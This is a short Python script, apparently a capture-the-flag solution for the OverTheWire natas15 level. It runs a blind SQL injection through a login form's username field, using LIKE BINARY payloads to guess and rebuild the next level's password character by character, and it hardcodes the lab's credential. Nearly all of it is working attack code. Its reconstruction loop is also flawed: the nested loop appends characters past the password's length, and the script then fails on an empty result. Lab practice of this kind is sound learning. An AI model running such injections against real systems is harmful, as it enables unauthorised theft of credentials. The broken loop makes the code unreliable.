#!/bin/python3
import requests
from requests.auth import HTTPBasicAuth

URL = 'http://natas15.natas.labs.overthewire.org/'
Auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filter_injection = ['natas16" and password LIKE BINARY "%', '', '%" #']
bruteforce_injection = ['natas16" and password LIKE BINARY "', '', '%" #']
password = ''

def attempt_passwords(charset, template, password='', match_exit = False):
	correct = []
	for attempt in charset:
		injection = return_injection(template, password + attempt)
		print(f'\t [ ] Trying injection {injection}')
		Data = {'username' : injection}
		r = requests.post(URL, auth=Auth, data=Data)
		if 'exists' in r.text:
			print(f'\t [*] Injection {injection} success!')
			correct.append(attempt)
			if match_exit == True:
				return correct
	print(f'\t [*] End of input reached')
	return correct

def return_injection(template, attempt):
	injection = template
	injection[1] = attempt
	return ''.join(injection)

print(f'\t [ ] Attempting charset filtering')

filtered = attempt_passwords(list(charset), filter_injection)

print(f'\t [*] Charset filtering completed')
print(f'Letters to Bruteforce With:\n{filtered}')

print('\t [ ] Attempting to construct the password from guesses')
for x in range(0, 32):
	for char in filtered:
		password += attempt_passwords(filtered, bruteforce_injection, password = password, match_exit = True)[0]
		print(f' [*] Match found, password = {password}...')

print(f'Password Constructed\nPassword = {password}')